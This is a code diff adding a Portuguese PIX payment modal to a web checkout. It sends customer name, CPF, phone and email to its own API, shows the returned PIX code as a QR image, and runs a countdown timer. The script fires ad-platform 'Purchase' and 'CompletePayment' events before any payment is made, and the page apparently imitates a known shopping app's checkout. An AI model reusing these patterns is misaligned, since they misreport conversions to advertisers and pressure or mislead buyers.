+        <button onclick="document.getElementById('checkoutPixModal').style.display='none'" style="border:none; background:transparent; padding:0; display:flex; cursor: pointer;">
+            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#111" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="15 18 9 12 15 6"></polyline></svg>
+        </button>
+        <div style="flex: 1; text-align: center; font-size: 16px; font-weight: 700; color: #111;">
+            Código do pagamento
+        </div>
+        <div style="width: 24px;"></div>
+    </div>
+
+    <!-- Info Section -->
+    <div style="padding: 24px 20px;">
+        <div style="display: flex; justify-content: space-between; align-items: flex-start;">
+            <div>
+                <div style="font-size: 24px; font-weight: 800; color: #111; line-height: 1.2;">Aguardando o<br>pagamento</div>
+                <div id="pixModalTotal" style="font-size: 24px; font-weight: 800; color: #111; margin-top: 4px;">R$ 0,00</div>
+            </div>
+            <div style="width: 40px; height: 40px; background: #FF9800; border-radius: 50%; display: flex; align-items: center; justify-content: center;">
+                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10" stroke="none" fill="#FF9800"/><polyline points="12 6 12 12 16 14" stroke="#fff"/></svg>
+            </div>
+        </div>
+
+        <div style="display: flex; align-items: center; gap: 8px; margin-top: 16px;">
+            <span style="font-size: 14px; color: #777;">Vence em</span>
+            <div style="background: #fe2c55; color: #fff; padding: 4px 8px; border-radius: 4px; font-size: 13px; font-weight: 700; display: flex; align-items: center; gap: 4px;">
+                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2"><circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline></svg>
+                <span id="pixModalTimer">23:59:44</span>
+            </div>
+        </div>
+        
+        <div style="font-size: 14px; color: #777; margin-top: 8px;">
+            Prazo <span id="pixModalDeadline">24 de jul. de 2026, 13:47</span>
+        </div>
+    </div>
+
+    <!-- QR Code Box -->
+    <div style="margin: 16px; background: #fff; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.05); padding: 20px; position: relative;">
+        <div style="display: flex; align-items: center; margin-bottom: 24px;">
+            <div style="margin-right: 8px; width: 24px; height: 24px;">
+                <svg width="24" height="24" viewBox="0 0 32 32" fill="#32BCAD">
+                    <path d="M9.8 4.6L2.3 12c-.5.5-.5 1.3 0 1.8l7.5 7.5 7.5-7.5c.5-.5.5-1.3 0-1.8L9.8 4.6z"/>
+                    <path d="M22.2 4.6l-7.5 7.5 7.5 7.5 7.5-7.5c.5-.5.5-1.3 0-1.8L22.2 4.6z"/>
+                    <path d="M16 10.8l-7.5 7.5 7.5 7.5 7.5-7.5L16 10.8z"/>
+                </svg>
+            </div>
+            <div style="font-size: 16px; font-weight: 700; color: #111;">PIX</div>
+        </div>
+
+        <!-- Placeholder for Gateway QR Code -->
+        <div id="pixQrCodeContainer" style="width: 200px; height: 200px; margin: 0 auto 24px auto; background: #f9f9f9; border: 1px dashed #ccc; display: flex; align-items: center; justify-content: center; color: #999; font-size: 12px; text-align: center;">
+            [Cole seu QR CODE<br>da Gateway aqui]
+        </div>
+
+        <div style="font-size: 18px; font-weight: 700; color: #111; text-align: center; margin-bottom: 20px; word-break: break-all; line-height: 1.4;" id="pixCodeText">
+            00020101021226870014...
+        </div>
+
+        <button onclick="window.copyPixCode()" style="width: 100%; background: #fe2c55; color: #fff; border: none; border-radius: 8px; padding: 14px; font-size: 16px; font-weight: 600; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 8px;">
+            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
+            Copiar
+        </button>
+    </div>
+
+    <div style="padding: 0 20px; font-size: 12px; color: #777; text-align: center; line-height: 1.5; margin-top: 8px; margin-bottom: 30px;">
+        Para acessar esta página no app, abra <strong>Loja > Pedidos > Sem pagamento > Visualizar o código</strong>
+    </div>
+</div>
+
+<!-- Copied Toast -->
+<div id="pixCopiedToast" style="display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); background: rgba(0,0,0,0.8); color: #fff; padding: 12px 24px; border-radius: 8px; font-size: 14px; font-weight: 600; z-index: 130000;">
+    Chave copiada
+</div>
+
+<script>
+window.openPixModal = function(customerData) {
+      let submitBtn = document.querySelector('button[onclick="window.attemptActionWithAddress(window.openPixModal)"]');
+      let originalText = "Fazer pedido";
+      if (submitBtn) {
+          originalText = submitBtn.innerText;
+          submitBtn.innerText = "Processando...";
+          submitBtn.style.opacity = "0.7";
+          submitBtn.disabled = true;
+      }
+      
+      let totalEl = document.getElementById('checkoutTotal');
+      let amountStr = '0';
+      if(totalEl) {
+          document.getElementById('pixModalTotal').innerText = totalEl.innerText;
+          amountStr = totalEl.innerText.replace(/[^\d,]/g, '').replace(',', '.');
+      }
+      
+      // Fetch from API before opening modal
+      if (customerData) {
+          fetch('/api/checkout.php', {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({
+                  customer_name: customerData.name || '',
+                  customer_document: customerData.cpf || '',
+                  customer_phone: customerData.phone || '',
+                  customer_email: customerData.email || '',
+                  amount: parseFloat(amountStr) || 0
+              })
+          })
+          .then(res => res.json())
+          .then(data => {
+              if (submitBtn) {
+                  submitBtn.innerText = originalText;
+                  submitBtn.style.opacity = "1";
+                  submitBtn.disabled = false;
+              }
+
+              if (data.success && data.qr_code) {
+                  let orderVal = parseFloat(amountStr) || 0;
+                  if (window.ttq && typeof window.ttq.track === 'function') {
+                      ttq.track('AddPaymentInfo', { content_type: 'product', value: orderVal, currency: 'BRL' });
+                      ttq.track('PlaceAnOrder', { content_type: 'product', value: orderVal, currency: 'BRL' });
+                      ttq.track('CompletePayment', { content_type: 'product', value: orderVal, currency: 'BRL' });
+                  }
+                  if (typeof fbq === 'function') {
+                      fbq('track', 'Purchase', { value: orderVal, currency: 'BRL' });
+                  }
+
+                  let pixTextEl = document.getElementById('pixCodeText');
+                  if (pixTextEl) pixTextEl.innerText = data.qr_code;
+                  
+                  // Render the QR Image instantly with a faster CDN
+                  let qrContainer = document.getElementById('pixQrCodeContainer');
+                  if (qrContainer) {
+                      qrContainer.innerHTML = '';
+                      let img = document.createElement('img');
+                      img.src = 'https://quickchart.io/qr?size=250&text=' + encodeURIComponent(data.qr_code);
+                      img.style.width = '100%';
+                      img.style.height = '100%';
+                      img.style.objectFit = 'contain';
+                      qrContainer.appendChild(img);
+                  }
+                  
+                  // Start Timer
+                  let now = new Date();
+                  let utc = now.getTime() + (now.getTimezoneOffset() * 60000);
+                  let brtDate = new Date(utc - (3600000 * 3));
+                  brtDate.setMinutes(brtDate.getMinutes() + 10);
+                  
+                  let months = ['jan.', 'fev.', 'mar.', 'abr.', 'mai.', 'jun.', 'jul.', 'ago.', 'set.', 'out.', 'nov.', 'dez.'];
+                  let day = brtDate.getDate();
+                  let month = months[brtDate.getMonth()];
+                  let year = brtDate.getFullYear();
+                  let hours = String(brtDate.getHours()).padStart(2, '0');
+                  let minutes = String(brtDate.getMinutes()).padStart(2, '0');
+                  
+                  document.getElementById('pixModalDeadline').innerText = `${day} de ${month} de ${year}, ${hours}:${minutes}`;
+                  
+                  if (!window.pixTimerInterval) {
+                      let totalSeconds = 10 * 60;
+                      window.pixTimerInterval = setInterval(() => {
+                          totalSeconds--;
+                          if (totalSeconds < 0) totalSeconds = 0;
+                          let h = String(Math.floor(totalSeconds / 3600)).padStart(2, '0');
+                          let m = String(Math.floor((totalSeconds % 3600) / 60)).padStart(2, '0');
+                          let s = String(totalSeconds % 60).padStart(2, '0');
+                          document.getElementById('pixModalTimer').innerText = `${h}:${m}:${s}`;
+                      }, 1000);
+                  }
+                  
+                  // Finally, display the populated modal instantly
+                  let modal = document.getElementById('checkoutPixModal');
+                  modal.style.display = 'flex';
+              } else {
+                  alert("Erro ao gerar PIX. Tente novamente.");
+                  console.error("Checkout error:", data);
+              }
+          })
+          .catch(err => {
+              if (submitBtn) {
+                  submitBtn.innerText = originalText;
+                  submitBtn.style.opacity = "1";
+                  submitBtn.disabled = false;
+              }
+              alert("Erro de conexao. Tente novamente.");
+              console.error(err);
+          });
+      }
+};
+
+window.copyPixCode = function() {
+    let code = document.getElementById('pixCodeText').innerText.replace(/\n/g, '').trim();
+    if (navigator.clipboard && window.isSecureContext) {
+        navigator.clipboard.writeText(code).then(() => showCopiedToast());
+    } else {
+        let textArea = document.createElement("textarea");
+        textArea.value = code;
+        textArea.style.position = "fixed";
+        textArea.style.left = "-999999px";
+        textArea.style.top = "-999999px";
+        document.body.appendChild(textArea);
+        textArea.focus();
+        textArea.select();
+        try { document.execCommand('copy'); } catch (err) { }
+        textArea.remove();
+        showCopiedToast();
+    }
+};
+
+function showCopiedToast() {
+    let toast = document.getElementById('pixCopiedToast');
+    toast.style.display = 'block';
+    setTimeout(() => { toast.style.display = 'none'; }, 2000);
+}
+</script>
+
+
+
+
+
+
